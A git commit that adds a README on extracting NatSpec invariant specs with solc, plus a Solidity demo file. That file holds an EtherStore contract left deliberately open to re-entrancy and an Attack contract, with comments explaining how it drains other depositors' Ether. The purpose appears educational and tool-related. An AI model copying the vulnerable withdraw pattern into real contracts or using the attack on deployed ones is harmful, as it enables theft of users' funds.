e061f77186df035866f3c8b7929d3ed1d7afe4fe
Billy1900 <billyrobertluo@gmail.com>
2023-05-30 16:09:05 -0400

    update first demo of getting the spec

--- README.md
+++ README.md
@@ -1,2 +1,35 @@
 # demo
 The first demo of TCT
+
+- Install solc compiler locally: https://docs.soliditylang.org/en/develop/installing-solidity.html
+
+- A tool to quickly switch between Solidity compiler versions: https://github.com/crytic/solc-select
+
+- Natspec: https://docs.soliditylang.org/en/latest/natspec-format.html
+
+- use the command to get the spec
+    ```shell
+    solc --userdoc --devdoc re_victim.sol
+    ```
+
+    natspec content for `re_victim.sol`
+    ```
+    ======= re_victim.sol:Attack =======
+    Developer Documentation
+    {"kind":"dev","methods":{},"version":1}
+    User Documentation
+    {"kind":"user","methods":{},"version":1}
+
+    ======= re_victim.sol:EtherStore =======
+    Developer Documentation
+    {"kind":"dev","methods":{"leaves()":{"custom:experimental":"invariant: (forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply)"},"withdraw()":{"custom:experimental":"invariant: (forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply) "}},"version":1}
+    User Documentation
+    {"kind":"user","methods":{},"version":1}
+
+    ======= re_victim.sol:EtherStoreChild =======
+    Developer Documentation
+    {"kind":"dev","methods":{"withdraw()":{"custom:experimental":"invariant: (forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply) "}},"version":1}
+    User Documentation
+    {"kind":"user","methods":{},"version":1}
+
+    ```
---
+++ re_victim.sol
@@ -0,0 +1,94 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+/*
+This example is referred to https://solidity-by-example.org/hacks/re-entrancy/.
+
+EtherStore is a contract where you can deposit and withdraw ETH.
+This contract is vulnerable to re-entrancy attack.
+Let's see why.
+
+1. Deploy EtherStore
+2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
+3. Deploy Attack with address of EtherStore
+4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
+   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
+   plus 1 Ether sent from this contract).
+
+What happened?
+Attack was able to call EtherStore.withdraw multiple times before
+EtherStore.withdraw finished executing.
+
+Here is how the functions were called
+- Attack.attack
+- EtherStore.deposit
+- EtherStore.withdraw
+- Attack fallback (receives 1 Ether)
+- EtherStore.withdraw
+- Attack.fallback (receives 1 Ether)
+- EtherStore.withdraw
+- Attack fallback (receives 1 Ether)
+*/
+
+contract EtherStore {
+    mapping(address => uint) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    /// @custom:experimental invariant: (forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply) 
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    /// @custom:experimental invariant: (forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply)
+    function leaves() external virtual pure returns(uint256) {
+        return 2;
+    }
+}
+
+contract EtherStoreChild is EtherStore {
+    /// @inheritdoc EtherStore
+    function leaves() external override(EtherStore) pure returns(uint256) {
+        return 3;
+    }
+}
+
+
+contract Attack {
+    EtherStore public etherStore;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // Fallback is called when EtherStore sends Ether to this contract.
+    fallback() external payable {
+        if (address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
